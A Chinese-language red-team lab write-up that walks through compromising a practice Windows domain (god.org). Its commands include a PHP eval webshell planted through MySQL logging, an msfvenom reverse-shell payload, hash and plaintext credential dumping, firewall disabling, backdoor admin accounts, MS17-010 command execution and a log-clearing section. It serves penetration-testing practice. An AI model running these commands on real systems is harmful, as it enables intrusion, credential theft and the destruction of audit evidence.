---
title: ATTCK红队评估01
updated: 2023-04-04 01:28:54Z
created: 2023-01-30 02:25:24Z
---

### **拓扑环境如下：**

### ![71844d4b6f701996110fbfee4665d6fc.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/71844d4b6f701996110fbfee4665d6fc.png)

### 网卡配置如下：

### kali:  192.168.55.123

### win7:  192.168.55.130  && 192.168.52.143(内网网卡)

### win2003:  192.168.52.141(域内主机)

### win2008:  192.168.52.138(域控)

* * *

### **web渗透：**

### 首先，进行主机发现，看到win7的主机ip为192.168.55.130,开放了80和3306端口

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/07fcb8ede9dd5d90de705162c665e8aa.png" alt="07fcb8ede9dd5d90de705162c665e8aa.png" width="589" height="278" class="jop-noMdConv">

### 访问80端口，出现php探针页面

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/32bbf9e7bd2077c69e300b6438da01a5.png" alt="32bbf9e7bd2077c69e300b6438da01a5.png" width="657" height="472" class="jop-noMdConv">

### 扫描web目录

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/89d1743aa69c60a3bfc2332d30c45539.png" alt="89d1743aa69c60a3bfc2332d30c45539.png" width="668" height="378" class="jop-noMdConv">

### 尝试用root/root弱口令登录phpmyadmin,成功登录

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/a92e1ad4c67c847125930debd53a68ca.png" alt="a92e1ad4c67c847125930debd53a68ca.png" width="698" height="344" class="jop-noMdConv">

### secure\_file\_prive=null，限制mysqld，不允许导入导出；

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/fa53217ae23aa68f7a549833c052eef6.png" alt="fa53217ae23aa68f7a549833c052eef6.png" width="675" height="129" class="jop-noMdConv">

### 查询日志写入是否开启

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/67e97109aa6d408ac664c4721cad6c1b.png" alt="67e97109aa6d408ac664c4721cad6c1b.png" width="611" height="299" class="jop-noMdConv">

### 开启日志并修改日志保存路径

### `set global general_log = on;`

### `set global general_log_file='C:\\phpStudy\\WWW\\shell.php';`

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/aaa2218d2157402b5bcb8dca51183cdc.png" alt="aaa2218d2157402b5bcb8dca51183cdc.png" width="730" height="317" class="jop-noMdConv">

### 然后`select '<?php @eval($_POST[a]);?>'`写入shell至日志文件

### 尝试连接shell，成功连接

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/c54d71fc26fb24d5f4ce3104598e7fcf.png" alt="c54d71fc26fb24d5f4ce3104598e7fcf.png" width="757" height="300" class="jop-noMdConv">

### 也可以通过yxcms进行getshell

* * *

### 内网渗透：

### 制作一个msf木马并上传至目标服务器，并设置连接

### `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.55.123 LPORT=5678 -f exe -o shell.exe`

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/1a559cb4fc3f9080f1027fc14928b1fc.png" alt="1a559cb4fc3f9080f1027fc14928b1fc.png" width="850" height="392" class="jop-noMdConv">

### **PS：meterpretre shell如果乱码，可以输入`chcp 65001`去除乱码**

### 查看主机信息，可以看到该主机属于`god.org`域中，内网网卡ip为192.168.52.143

```
C:\phpStudy\WWW>ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : stu1
   Primary Dns Suffix  . . . . . . . : god.org
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : god.org

Ethernet adapter �������� 5:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #3
   Physical Address. . . . . . . . . : 00-0C-29-A7-C1-B2
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::98c:bf05:1e5c:5fbb%26(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.55.130(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
   DHCPv6 IAID . . . . . . . . . . . : 721423401
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-F3-A2-4E-00-0C-29-A7-C1-A8
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter ��������:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-0C-29-A7-C1-A8
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::fcff:cf71:1487:9c27%11(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.52.143(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.52.2
   DHCPv6 IAID . . . . . . . . . . . : 234884137
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-F3-A2-4E-00-0C-29-A7-C1-A8
   DNS Servers . . . . . . . . . . . : 192.168.52.138
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

### systeminfo信息

```
C:\phpStudy\WWW>systeminfo
systeminfo

Host Name:                 STU1
OS Name:                   Microsoft Windows 7 专业版 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows 用户
Registered Organization:   
Product ID:                00371-177-0000061-85693
Original Install Date:     2019/8/25, 9:54:10
System Boot Time:          2023/2/1, 10:41:12
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 80 Stepping 0 AuthenticAMD ~3194 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 2020/11/12
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             zh-cn;Chinese (China)
Input Locale:              zh-cn;Chinese (China)
Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,284 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,218 MB
Virtual Memory: In Use:    877 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    god.org
Logon Server:              \\OWA
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB2534111
                           [02]: KB2999226
                           [03]: KB958488
                           [04]: KB976902
Network Card(s):           5 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: 本地连接
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.52.143
                                 [02]: fe80::fcff:cf71:1487:9c27
                           [02]: TAP-Windows Adapter V9
                                 Connection Name: 本地连接 2
                                 Status:          Media disconnected
                           [03]: Microsoft Loopback Adapter
                                 Connection Name: Npcap Loopback Adapter
                                 DHCP Enabled:    Yes
                                 DHCP Server:     255.255.255.255
                                 IP address(es)
                                 [01]: 169.254.129.186
                                 [02]: fe80::b461:ccad:e30f:81ba
                           [04]: TAP-Windows Adapter V9
                                 Connection Name: 本地连接 3
                                 Status:          Media disconnected
                           [05]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: 本地连接 5
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.55.130
                                 [02]: fe80::98c:bf05:1e5c:5fbb
```

### 尝试getsystem并成功

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/b11b43d98e71ea34b1a8956cd7f412d9.png" alt="b11b43d98e71ea34b1a8956cd7f412d9.png" width="674" height="149" class="jop-noMdConv">

```
信息收集
ipconfig /all 查询本机IP段，所在域等
net config Workstation 当前计算机名，全名，用户名，系统版本，工作站域，登陆域
net user 本机用户列表
net localhroup administrators 本机管理员[通常含有域用户]
net user /domain 查询域用户
net user 用户名 /domain 获取指定用户的账户信息
net user /domain b404 pass 修改域内用户密码，需要管理员权限
net group /domain 查询域里面的工作组
net group 组名 /domain 查询域中的某工作组
net group “domain admins” /domain 查询域管理员列表
net group “domain controllers” /domain 查看域控制器(如果有多台)
net time /domain 判断主域，主域服务器都做时间服务器
ipconfig /all 查询本机IP段，所在域等
```

### **收集域内信息**

### 查看域用户

### **<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/c08c4728ee3497b4ec1b5d7f6d44e5a7.png" alt="c08c4728ee3497b4ec1b5d7f6d44e5a7.png" width="785" height="227" class="jop-noMdConv">**

### 查看域管

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/cb4c3d443f994cfa5b4b87b42b8f982c.png" alt="cb4c3d443f994cfa5b4b87b42b8f982c.png" width="784" height="253" class="jop-noMdConv">

### 定位域控，域控一般都为时间服务器

```
C:\Windows\system32>net time /domain
net time /domain
Current time at \\owa.god.org is 2023/2/1 11:41:04

The command completed successfully.
```

### 确定域控ip为`192.168.52.138`

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/87dc8d994343b159810ad8ee0e203330.png" alt="87dc8d994343b159810ad8ee0e203330.png" width="566" height="220" class="jop-noMdConv">

### 接下来迁移会话进程

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/27f352614a4bc73c6757751ab1527dbe.png" alt="27f352614a4bc73c6757751ab1527dbe.png" width="608" height="211" class="jop-noMdConv">

### hashdump

### **PS:格式是：用户名称: RID:LM-HASH 值: NT-HASH 值，rid 是 windows 系统账户对应固定的值，类似于 linux 的 uid，gid 号，500 为 administrator，501 为 guest 等。而 lm 的 hash 和 nt 的 hash,都是对用户密码进行的加密，只不过加密方式不一样。复制其中一种加密的 hash 可以直接使用在线 cmd5 破解**

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### 由于已经获得system权限，可以加载`load kiwi`模块，`creds_all`导出明文密码`hongrisec@2019`

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/c422e005743256a98801712346950f00.png" alt="c422e005743256a98801712346950f00.png" width="621" height="421" class="jop-noMdConv">

### 查看3389开放情况，并尝试打开3389,关闭防火墙，连接远程桌面

### `netstat -an | findstr “3389”`查看远程端口

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/ac6d64d06ae5849031880b418f431f75.png" alt="ac6d64d06ae5849031880b418f431f75.png" width="320" height="66" class="jop-noMdConv">

### 开启3389`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`

### 关闭3389`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f）`

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/2d2d14840721f3512a00006c0d226771.png" alt="2d2d14840721f3512a00006c0d226771.png" width="876" height="94" class="jop-noMdConv">

### 关闭防火墙：

### Windows Server 2003 系统及之前版本`netsh firewall set opmode disable`

### Windows Server 2003 之后系统版本`netsh advfirewall set allprofiles state off`

### 或者

### 允许 3389 端口放行`netsh advfirewall firewall add rule name=“Remote Desktop” protocol=TCP dir=in localport=3389 action=allow`

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/1651239ba9f818ff90063a8694365f8b.png" alt="1651239ba9f818ff90063a8694365f8b.png" width="795" height="155" class="jop-noMdConv"> <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/e5cb6c0126740c8c4a45c4ce956941d9.png" alt="e5cb6c0126740c8c4a45c4ce956941d9.png" width="625" height="369" class="jop-noMdConv">

### 可以添加一个用户备用啥的

### `net user [username] [password] /add`

### 添加到Administrators用户组

### `net localgroup Administrators [username] /add`

### 激活用户

### `net user [username] /active:yes`

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/207d46dba19b1687398b68b3cf6a0d67.png" alt="207d46dba19b1687398b68b3cf6a0d67.png" width="653" height="314" class="jop-noMdConv">

### 搭建代理–横向渗透

### 由于已经发现win7存在内网`192.168.52`的c段，搭建代理通道

### 首先添加路由,并将会话切至后台

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/89c270848e19b7ee2adb05c213b64f1c.png" alt="89c270848e19b7ee2adb05c213b64f1c.png" width="672" height="448" class="jop-noMdConv">

### 设置socks代理

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/a5f97594e23c016057808cd2c2101c67.png" alt="a5f97594e23c016057808cd2c2101c67.png" width="714" height="495" class="jop-noMdConv">

### 再设置proxychains代理配置为msf的socks代理端口`/etc/proxychains4.conf`

### ![5de723669abd12097b48718fcf258ae5.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/5de723669abd12097b48718fcf258ae5.png)

### 探测52网段主机存活

### <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/4a193f55aec5181a4eb84bb00418077d.png" alt="4a193f55aec5181a4eb84bb00418077d.png" width="707" height="336" class="jop-noMdConv">

首先先`win2003`–`192.168.52.141`

使用`use auxiliary/scanner/portscan/tcp `对`192.168.52.141`进行端口扫描

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/d1434ac9f728648054b21c4e15252cec.png" alt="d1434ac9f728648054b21c4e15252cec.png" width="776" height="302" class="jop-noMdConv">

可以看到开启了445端口，探测下samba服务`use auxiliary/scanner/smb/smb_version`

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/de2abf95fff0e219af5dc0d615b8a896.png" alt="de2abf95fff0e219af5dc0d615b8a896.png" width="764" height="132" class="jop-noMdConv">

测试smb相关的漏洞

`use auxiliary/admin/smb/ms17_010_command`

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/466ee5a98ddb1f51f3989f0694b2770e.png" alt="466ee5a98ddb1f51f3989f0694b2770e.png" width="801" height="386" class="jop-noMdConv">

设置命令–>添加一个用户并设置管理员权限，然后开启3389端口

`set command "net user hack #hack123@ /add" 创建用户`

`set command "net localgroup Administrators hack /add"`

`set command ‘REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f’ 打开3389端口`

`set command "netsh firewall set opmode mode=disable" 关闭防火墙`

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/8427bec12f778b75daac39158c670acb.png" alt="8427bec12f778b75daac39158c670acb.png" width="660" height="466" class="jop-noMdConv">

* * *

## 拿下域控权限

扫描域控端口

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/9f77a1164dfa23e9c06a612f48760bbd.png" alt="9f77a1164dfa23e9c06a612f48760bbd.png" width="792" height="539" class="jop-noMdConv"> <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/e55483a3394c21c907b6fa8162eda9e5.png" alt="e55483a3394c21c907b6fa8162eda9e5.png" width="908" height="197" class="jop-noMdConv">

发现smb服务，尝试利用smb漏洞

`use exploit/windows/smb/ms17_010_psexec`未成功

用`use auxiliary/admin/smb/ms17_010_command`添加用户并开启3389然后连接

```
set command "net user hack #hack123@ /add" 创建用户

set command  "net localgroup Administrators hack /add" 

set command ‘REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f’ 打开3389端口

set command  "netsh firewall set opmode mode=disable"  关闭防火墙
```

* * *

这是清理痕迹的一些参考方法

```
有远程桌面权限时手动删除日志：
开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志

wevtutil：
    wevtutil el 列出系统中所有日志名称
    wevtutil cl system 清理系统日志
    wevtutil cl application 清理应用程序日志
    wevtutil cl security 清理安全日志

meterperter自带清除日志功能：
clearev 清除windows中的应用程序日志、系统日志、安全日志

清除recent：
在文件资源管理器中点击 "查看" -> "选项" ->在常规->隐私中点击" 清除" 按钮
或直接打开C:\Users\Administrator\Recent并删除所有内容
或在命令行中输入del /f /s /q  "%userprofile%\Recent*.*
```